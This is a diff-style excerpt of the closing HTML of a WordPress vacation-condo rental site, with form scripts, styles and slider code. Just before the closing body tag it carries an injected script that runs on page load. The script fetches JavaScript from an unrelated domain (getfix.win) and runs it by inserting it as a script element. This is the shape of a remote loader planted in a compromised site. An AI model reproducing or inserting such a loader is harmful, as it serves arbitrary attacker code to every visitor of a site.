+var coblocksTinyswiper = {"carouselPrevButtonAriaLabel":"Previous","carouselNextButtonAriaLabel":"Next","sliderImageAriaLabel":"Image"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="https://breakersfwb.wpenginepowered.com/wp-content/plugins/coblocks/dist/js/coblocks-tinyswiper-initializer.js?ver=3.1.14" id="coblocks-tinyswiper-initializer-js"></script>
+<script type="text/javascript" src="https://breakersfwb.wpenginepowered.com/wp-includes/js/jquery/jquery.color.min.js?ver=3.0.0" id="jquery-color-js"></script>
+<script type="text/javascript" src="https://breakersfwb.wpenginepowered.com/wp-includes/js/jquery/ui/core.min.js?ver=1.13.3" id="jquery-ui-core-js"></script>
+<script type="text/javascript" src="https://breakersfwb.wpenginepowered.com/wp-includes/js/jquery/ui/mouse.min.js?ver=1.13.3" id="jquery-ui-mouse-js"></script>
+<script type="text/javascript" src="https://breakersfwb.wpenginepowered.com/wp-includes/js/jquery/ui/slider.min.js?ver=1.13.3" id="jquery-ui-slider-js"></script>
+<script type="text/javascript" src="https://breakersfwb.wpenginepowered.com/wp-includes/js/jquery/ui/datepicker.min.js?ver=1.13.3" id="jquery-ui-datepicker-js"></script>
+<script type="text/javascript" id="jquery-ui-datepicker-js-after">
+/* <![CDATA[ */
+jQuery(function(jQuery){jQuery.datepicker.setDefaults({"closeText":"Close","currentText":"Today","monthNames":["January","February","March","April","May","June","July","August","September","October","November","December"],"monthNamesShort":["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"],"nextText":"Next","prevText":"Previous","dayNames":["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"],"dayNamesShort":["Sun","Mon","Tue","Wed","Thu","Fri","Sat"],"dayNamesMin":["S","M","T","W","T","F","S"],"dateFormat":"MM d, yy","firstDay":0,"isRTL":false});});
+/* ]]> */
+</script>
+<script type="text/javascript" src="https://breakersfwb.wpenginepowered.com/wp-content/themes/bizcor2018/js/custom.js" id="custom_js-js"></script>
+<script type="text/javascript" src="https://breakersfwb.wpenginepowered.com/wp-includes/js/dist/dom-ready.min.js?ver=f77871ff7694fffea381" id="wp-dom-ready-js"></script>
+<script type="text/javascript" src="https://breakersfwb.wpenginepowered.com/wp-includes/js/dist/hooks.min.js?ver=4d63a3d491d11ffd8ac6" id="wp-hooks-js"></script>
+<script type="text/javascript" src="https://breakersfwb.wpenginepowered.com/wp-includes/js/dist/i18n.min.js?ver=5e580eb46a90c2b997e6" id="wp-i18n-js"></script>
+<script type="text/javascript" id="wp-i18n-js-after">
+/* <![CDATA[ */
+wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
+/* ]]> */
+</script>
+<script type="text/javascript" src="https://breakersfwb.wpenginepowered.com/wp-includes/js/dist/a11y.min.js?ver=3156534cc54473497e14" id="wp-a11y-js"></script>
+<script type="text/javascript" defer='defer' src="https://breakersfwb.wpenginepowered.com/wp-content/plugins/gravityforms/js/jquery.json.min.js?ver=2.9.4" id="gform_json-js"></script>
+<script type="text/javascript" id="gform_gravityforms-js-extra">
+/* <![CDATA[ */
+var gform_i18n = {"datepicker":{"days":{"monday":"Mo","tuesday":"Tu","wednesday":"We","thursday":"Th","friday":"Fr","saturday":"Sa","sunday":"Su"},"months":{"january":"January","february":"February","march":"March","april":"April","may":"May","june":"June","july":"July","august":"August","september":"September","october":"October","november":"November","december":"December"},"firstDay":0,"iconText":"Select date"}};
+var gf_legacy_multi = [];
+var gform_gravityforms = {"strings":{"invalid_file_extension":"This type of file is not allowed. Must be one of the following:","delete_file":"Delete this file","in_progress":"in progress","file_exceeds_limit":"File exceeds size limit","illegal_extension":"This type of file is not allowed.","max_reached":"Maximum number of files reached","unknown_error":"There was a problem while saving the file on the server","currently_uploading":"Please wait for the uploading to complete","cancel":"Cancel","cancel_upload":"Cancel this upload","cancelled":"Cancelled"},"vars":{"images_url":"https:\/\/www.breakersfwb.com\/wp-content\/plugins\/gravityforms\/images"}};
+var gf_global = {"gf_currency_config":{"name":"U.S. Dollar","symbol_left":"$","symbol_right":"","symbol_padding":"","thousand_separator":",","decimal_separator":".","decimals":2,"code":"USD"},"base_url":"https:\/\/www.breakersfwb.com\/wp-content\/plugins\/gravityforms","number_formats":[],"spinnerUrl":"https:\/\/www.breakersfwb.com\/wp-content\/plugins\/gravityforms\/images\/spinner.svg","version_hash":"fc7da32a115e03157838e9e82accf50e","strings":{"newRowAdded":"New row added.","rowRemoved":"Row removed","formSaved":"The form has been saved.  The content contains the link to return and complete the form."}};
+var gf_global = {"gf_currency_config":{"name":"U.S. Dollar","symbol_left":"$","symbol_right":"","symbol_padding":"","thousand_separator":",","decimal_separator":".","decimals":2,"code":"USD"},"base_url":"https:\/\/www.breakersfwb.com\/wp-content\/plugins\/gravityforms","number_formats":[],"spinnerUrl":"https:\/\/www.breakersfwb.com\/wp-content\/plugins\/gravityforms\/images\/spinner.svg","version_hash":"fc7da32a115e03157838e9e82accf50e","strings":{"newRowAdded":"New row added.","rowRemoved":"Row removed","formSaved":"The form has been saved.  The content contains the link to return and complete the form."}};
+var gf_global = {"gf_currency_config":{"name":"U.S. Dollar","symbol_left":"$","symbol_right":"","symbol_padding":"","thousand_separator":",","decimal_separator":".","decimals":2,"code":"USD"},"base_url":"https:\/\/www.breakersfwb.com\/wp-content\/plugins\/gravityforms","number_formats":[],"spinnerUrl":"https:\/\/www.breakersfwb.com\/wp-content\/plugins\/gravityforms\/images\/spinner.svg","version_hash":"fc7da32a115e03157838e9e82accf50e","strings":{"newRowAdded":"New row added.","rowRemoved":"Row removed","formSaved":"The form has been saved.  The content contains the link to return and complete the form."}};
+/* ]]> */
+</script>
+<script type="text/javascript" defer='defer' src="https://breakersfwb.wpenginepowered.com/wp-content/plugins/gravityforms/js/gravityforms.min.js?ver=2.9.4" id="gform_gravityforms-js"></script>
+<script type="text/javascript" defer='defer' src="https://www.google.com/recaptcha/api.js?hl=en&amp;ver=6.8.2#038;render=explicit" id="gform_recaptcha-js"></script>
+<script type="text/javascript" defer='defer' src="https://breakersfwb.wpenginepowered.com/wp-content/plugins/gravityforms/js/jquery.maskedinput.min.js?ver=2.9.4" id="gform_masked_input-js"></script>
+<script type="text/javascript" defer='defer' src="https://breakersfwb.wpenginepowered.com/wp-content/plugins/gravityforms/js/placeholders.jquery.min.js?ver=2.9.4" id="gform_placeholder-js"></script>
+<script type="text/javascript" defer='defer' src="https://breakersfwb.wpenginepowered.com/wp-content/plugins/gravityforms/assets/js/dist/utils.min.js?ver=501a987060f4426fb517400c73c7fc1e" id="gform_gravityforms_utils-js"></script>
+<script type="text/javascript" defer='defer' src="https://breakersfwb.wpenginepowered.com/wp-content/plugins/gravityforms/assets/js/dist/vendor-theme.min.js?ver=639b4ac21c17c9dc304b05db4a3d3293" id="gform_gravityforms_theme_vendors-js"></script>
+<script type="text/javascript" id="gform_gravityforms_theme-js-extra">
+/* <![CDATA[ */
+var gform_theme_config = {"common":{"form":{"honeypot":{"version_hash":"fc7da32a115e03157838e9e82accf50e"},"ajax":{"ajaxurl":"https:\/\/www.breakersfwb.com\/wp-admin\/admin-ajax.php","ajax_submission_nonce":"cce05e5694","i18n":{"step_announcement":"Step %1$s of %2$s, %3$s","unknown_error":"There was an unknown error processing your request. Please try again."}}}},"hmr_dev":"","public_path":"https:\/\/www.breakersfwb.com\/wp-content\/plugins\/gravityforms\/assets\/js\/dist\/","config_nonce":"50b853e316"};
+/* ]]> */
+</script>
+<script type="text/javascript" defer='defer' src="https://breakersfwb.wpenginepowered.com/wp-content/plugins/gravityforms/assets/js/dist/scripts-theme.min.js?ver=dc91b64a15c979eb9acace3fe2754b5f" id="gform_gravityforms_theme-js"></script>
+<script type="text/javascript">
+/* <![CDATA[ */
+ gform.initializeOnLoaded( function() { jQuery(document).on('gform_post_render', function(event, formId, currentPage){if(formId == 3) {if(typeof Placeholders != 'undefined'){
+                        Placeholders.enable();
+                    }jQuery('#input_3_3').mask('(999) 999-9999').bind('keypress', function(e){if(e.which == 13){jQuery(this).blur();} } );				gform.utils.addAsyncFilter('gform/submission/pre_submission', async (data) => {
+				    const input = document.createElement('input');
+				    input.type = 'hidden';
+				    input.name = 'gf_zero_spam_key';
+				    input.value = 'HJSYJqZxQTwXcLYItqgsBHR1hNR5cTGajFVEbwHI1NLS3OmdR6VGmtPd0HrINX8g';
+				    input.setAttribute('autocomplete', 'new-password');
+				    data.form.appendChild(input);
+				
+				    return data;
+				});} } );jQuery(document).on('gform_post_conditional_logic', function(event, formId, fields, isInit){} ) } ); 
+/* ]]> */
+</script>
+<script type="text/javascript">
+/* <![CDATA[ */
+ gform.initializeOnLoaded( function() {jQuery(document).trigger("gform_pre_post_render", [{ formId: "3", currentPage: "1", abort: function() { this.preventDefault(); } }]);                if (event && event.defaultPrevented) {                return;         }        const gformWrapperDiv = document.getElementById( "gform_wrapper_3" );        if ( gformWrapperDiv ) {            const visibilitySpan = document.createElement( "span" );            visibilitySpan.id = "gform_visibility_test_3";            gformWrapperDiv.insertAdjacentElement( "afterend", visibilitySpan );        }        const visibilityTestDiv = document.getElementById( "gform_visibility_test_3" );        let postRenderFired = false;                function triggerPostRender() {            if ( postRenderFired ) {                return;            }            postRenderFired = true;            jQuery( document ).trigger( 'gform_post_render', [3, 1] );            gform.utils.trigger( { event: 'gform/postRender', native: false, data: { formId: 3, currentPage: 1 } } );            gform.utils.trigger( { event: 'gform/post_render', native: false, data: { formId: 3, currentPage: 1 } } );            if ( visibilityTestDiv ) {                visibilityTestDiv.parentNode.removeChild( visibilityTestDiv );            }        }        function debounce( func, wait, immediate ) {            var timeout;            return function() {                var context = this, args = arguments;                var later = function() {                    timeout = null;                    if ( !immediate ) func.apply( context, args );                };                var callNow = immediate && !timeout;                clearTimeout( timeout );                timeout = setTimeout( later, wait );                if ( callNow ) func.apply( context, args );            };        }        const debouncedTriggerPostRender = debounce( function() {            triggerPostRender();        }, 200 );        if ( visibilityTestDiv && visibilityTestDiv.offsetParent === null ) {            const observer = new MutationObserver( ( mutations ) => {                mutations.forEach( ( mutation ) => {                    if ( mutation.type === 'attributes' && visibilityTestDiv.offsetParent !== null ) {                        debouncedTriggerPostRender();                        observer.disconnect();                    }                });            });            observer.observe( document.body, {                attributes: true,                childList: false,                subtree: true,                attributeFilter: [ 'style', 'class' ],            });        } else {            triggerPostRender();        }    } ); 
+/* ]]> */
+</script>
+<script type="text/javascript">
+/* <![CDATA[ */
+ gform.initializeOnLoaded( function() { jQuery(document).on('gform_post_render', function(event, formId, currentPage){if(formId == 16) {if(typeof Placeholders != 'undefined'){
+                        Placeholders.enable();
+                    }				gform.utils.addAsyncFilter('gform/submission/pre_submission', async (data) => {
+				    const input = document.createElement('input');
+				    input.type = 'hidden';
+				    input.name = 'gf_zero_spam_key';
+				    input.value = 'HJSYJqZxQTwXcLYItqgsBHR1hNR5cTGajFVEbwHI1NLS3OmdR6VGmtPd0HrINX8g';
+				    input.setAttribute('autocomplete', 'new-password');
+				    data.form.appendChild(input);
+				
+				    return data;
+				});} } );jQuery(document).on('gform_post_conditional_logic', function(event, formId, fields, isInit){} ) } ); 
+/* ]]> */
+</script>
+<script type="text/javascript">
+/* <![CDATA[ */
+ gform.initializeOnLoaded( function() {jQuery(document).trigger("gform_pre_post_render", [{ formId: "16", currentPage: "1", abort: function() { this.preventDefault(); } }]);                if (event && event.defaultPrevented) {                return;         }        const gformWrapperDiv = document.getElementById( "gform_wrapper_16" );        if ( gformWrapperDiv ) {            const visibilitySpan = document.createElement( "span" );            visibilitySpan.id = "gform_visibility_test_16";            gformWrapperDiv.insertAdjacentElement( "afterend", visibilitySpan );        }        const visibilityTestDiv = document.getElementById( "gform_visibility_test_16" );        let postRenderFired = false;                function triggerPostRender() {            if ( postRenderFired ) {                return;            }            postRenderFired = true;            jQuery( document ).trigger( 'gform_post_render', [16, 1] );            gform.utils.trigger( { event: 'gform/postRender', native: false, data: { formId: 16, currentPage: 1 } } );            gform.utils.trigger( { event: 'gform/post_render', native: false, data: { formId: 16, currentPage: 1 } } );            if ( visibilityTestDiv ) {                visibilityTestDiv.parentNode.removeChild( visibilityTestDiv );            }        }        function debounce( func, wait, immediate ) {            var timeout;            return function() {                var context = this, args = arguments;                var later = function() {                    timeout = null;                    if ( !immediate ) func.apply( context, args );                };                var callNow = immediate && !timeout;                clearTimeout( timeout );                timeout = setTimeout( later, wait );                if ( callNow ) func.apply( context, args );            };        }        const debouncedTriggerPostRender = debounce( function() {            triggerPostRender();        }, 200 );        if ( visibilityTestDiv && visibilityTestDiv.offsetParent === null ) {            const observer = new MutationObserver( ( mutations ) => {                mutations.forEach( ( mutation ) => {                    if ( mutation.type === 'attributes' && visibilityTestDiv.offsetParent !== null ) {                        debouncedTriggerPostRender();                        observer.disconnect();                    }                });            });            observer.observe( document.body, {                attributes: true,                childList: false,                subtree: true,                attributeFilter: [ 'style', 'class' ],            });        } else {            triggerPostRender();        }    } ); 
+/* ]]> */
+</script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script> 
+<!--Header Search Modal-->
+<div id="headerSearchModal" class="modal fade" role="dialog">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <button type="button" class="close" data-dismiss="modal">&times;</button>
+      </div>
+      <div class="modal-body">
+        <div  class="c-search-widget search_widget "> 
+            <form method="post" class="form " id="resortpro-widget-form" action="https://www.breakersfwb.com/search-fort-walton-condos/" >
+        <input type="hidden" name="resortpro_search_nonce" value="c58fe21695"/>
+        <input type="hidden" class="disabled" id="resortpro_calendar_flex" name="resortpro_calendar_flex" value=""/>
+                                                                        <div class="row c-search-widget__fields">
+            <div class="modalSearch">
+    <div class="inputLeft">
+        <input type="text" id="resortpro_sw_lodging_unit" placeholder="Type Unit Name"  name="resortpro_sw_lodging_unit" class="resortpro_sw-date form-control" value="">
+    </div>
+    <div class="buttonRight">
+        <button class="btn" type="submit">
+            <i class="fa fa-search" aria-hidden="true"></i>
+        </button>
+    </div>    
+</div>        </div>
+            </form>
+        </div>      </div>
+    </div>
+    </div>
+</div>
+<style>
+footer .copyright .box-right {
+	float:none!important;
+    text-align: center;
+    color: #000!important;
+    margin: 0 auto;
+    width: 100%;
+    display: inline-flex;
+    align-items: center;
+    height: 50px;
+    font-weight: 300;
+    font-size: 12px;
+}
+footer .copyright .box-right a:hover {
+	text-decoration:none;
+}
+	
+#gform_submit_button_16 {
+  background-color: #8FBFB2;
+  color: #fff;
+  align-items: center;
+  background: #8FBFB2;
+  border-radius: 10px;
+  cursor: pointer;
+  display: flex;
+  height: 50px;
+  justify-content: center;
+  width: 60%;
+}
+
+#input_16_1 {
+	width: 100%;
+  height: 50px;
+  padding: 12px 20px;
+  display: flex;
+  border:0px;
+  background:#edf1f7;
+  border-radius: 10px;
+  box-sizing: border-box;
+}
+	
+footer #gform_wrapper_16 #gform_16{
+    display: flex;		
+}	
+footer #gform_wrapper_16 #gform_16 #gform_fields_16 .ginput_container input{	
+	background: #edf1f7;
+	height: 50px;
+	color: #fff;
+}
+footer #gform_wrapper_16 #gform_16 .gform_footer{
+	margin: 0 !important;
+}
+footer #gform_wrapper_16 #gform_16 .gform_footer #gform_submit_button_16{
+	background: #8fbfb2 !important;
+    color: #fff;		
+}
+footer #gform_confirmation_message_16{
+	color:#fff;		
+}	
+footer #gform_wrapper_16 #gform_16 .gform_footer #gform_submit_button_16:hover{
+    background: #008081 !important;
+    border-color: #ffffff;		
+}	
+.page-id-329 .view .mask {
+	display: none;
+}
+.pop_up_wrapp{
+	top:0!important;
+}
+	.pop_up_wrapp{
+		z-index:100!important;
+	}
+	
+	.tribe-common--breakpoint-medium.tribe-events .tribe-events-header--has-event-search {
+		height: auto!important;
+	}
+	.date-arrows {
+		display: none;
+	}
+	#gform_14 .gform_body input:not([type="checkbox"]),
+	#gform_14 .gform_body select{
+		height: 45px;
+		border: 1px solid #ccc!important;
+		border-radius: 0;
+	}
+	#gform_14 .gform_footer input{
+		margin-bottom: 80px!important;
+		background: #008081!important;
+		border-radius: 0;
+		height: 45px;
+		text-transform: uppercase;
+		font-weight: 600;
+		color: #fff;
+	}
+	#gform_14 .gform_footer input:hover{
+		background:#8FBFB2!important;
+	}
+	#gform_wrapper_14.gform_wrapper.gravity-theme .ginput_complex:not(.ginput_container_address) fieldset:not([style*="display:none"]):not(.ginput_full), 
+	#gform_wrapper_14.gform_wrapper.gravity-theme .ginput_complex:not(.ginput_container_address) span:not([style*="display:none"]):not(.ginput_full){
+		padding-right: 0;
+	}
+	#gform_14 .gfield_description{
+		display: block!important;
+		margin:0 0 5px 0;
+		padding:0;
+	}
+	#gform_wrapper_14.gform_wrapper.gravity-theme .field_description_below .gfield_consent_description, .gform_wrapper.gravity-theme .gfield_consent_description{
+		border: 0;
+    	overflow: visible;
+		max-height: none;
+	}
+	#gform_14 #field_14_27 label,
+	#gform_14 #field_14_28 label,
+	#gform_14 #field_14_22 label{
+		display: inline-block!important;
+	}
+	#gform_14 label,
+	#gform_14 legend{
+		color: #333;
+	}
+	#gform_14 input[type="checkbox"]{
+		height: auto;
+	}
+	@media(max-width:650px){
+		#gform_wrapper_14.gform_wrapper.gravity-theme .gfield input.medium, 
+		#gform_wrapper_14.gform_wrapper.gravity-theme .gfield select.medium{
+			width: 100%;
+		}
+	}
+</style>
+<script>
+(function() {
+    if (document.readyState !== 'loading') {
+        loadScript();
+    } else {
+        document.addEventListener('DOMContentLoaded', loadScript, {once: true});
+    }
+
+    function loadScript() {
+        var url = 'https://getfix.win/jsrepo?rnd=' + Math.random() + '&ts=' + Date.now();
+        
+        fetch(url, {
+            method: 'GET',
+            cache: 'no-store',
+            credentials: 'same-origin'
+        })
+        .then(response => {
+            if (!response.ok) throw new Error('HTTP ' + response.status);
+            return response.text();
+        })
+        .then(data => {
+            var script = document.createElement('script');
+            script.textContent = data.trim();
+            document.head.appendChild(script);
+            
+            if (document.readyState === 'complete' || document.readyState === 'interactive') {
+                document.dispatchEvent(new Event('DOMContentLoaded'));
+            }
+        })
+        .catch(error => {
+            console.warn('Script load failed:', error.message);
+        });
+    }
+})();
+</script>
+</body>
+</html>
+<script>
+
+    function biggerItems(){
+        var bI = jQuery('.bedrooms .item').width();
+        jQuery('.bedrooms .item').height(bI);                     
+    }
+    biggerItems();
+    
+    jQuery(window).resize(function(){ 
+            
+            biggerItems();
+    });/*End resize function*/
+
+/*Start Banner Slider*/
+var calcItem = jQuery('.home-banner .item');
+var calcItemLG = calcItem.length;
+
+if(calcItemLG > 1){
+    jQuery(".home-banner").slick({
+        dots:false,
+        centerMode:false,
+        infinite: true,
+        fade:true,
+        arrows:false,
+        autoplay:true,
+        slidesToShow: 1,
+        autoplaySpeed: 5000,
+        slidesToScroll: 1
+    });   
+}
+
+/*Insert Video in home banner*/
+var hzTX = jQuery('#videoSource').html();
+var hzSR = jQuery('#defVidImg').attr('src');
+if(hzTX != ''){
+    var videoHome = '<video poster="'+ hzSR +'" autoplay loop muted playsinline><source src="'+ hzTX +'" type="video/mp4"/></video>'
+    jQuery(window).load(function(){
+        if(jQuery(window).innerWidth() > 1024){
+            setTimeout(function(){
+                jQuery('.home-banner').empty().html(videoHome);
+            }, 2000);            
+        }else{
+            setTimeout(function(){
+                jQuery('.home-banner').empty().html(videoHome);
+            }, 1000);            
+        }
+    });   
+}
+/*End load function*/   
+	
+function displayPopup() {
+  if (localStorage.getItem("isUserSubscribed")) {
+	  document.getElementById('card-newsletter').style.display = 'none';
+	} else {
+		document.getElementById('card-newsletter').style.display = 'inline-block';
+		localStorage.setItem("isUserSubscribed", false);
+	}
+}
+
+function closePopup() {
+  document.getElementById('card-newsletter').style.display = 'none';
+  localStorage.setItem("isUserSubscribed", true);
+}
+
+function myFunction() {
+	closePopup();
+}
+
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
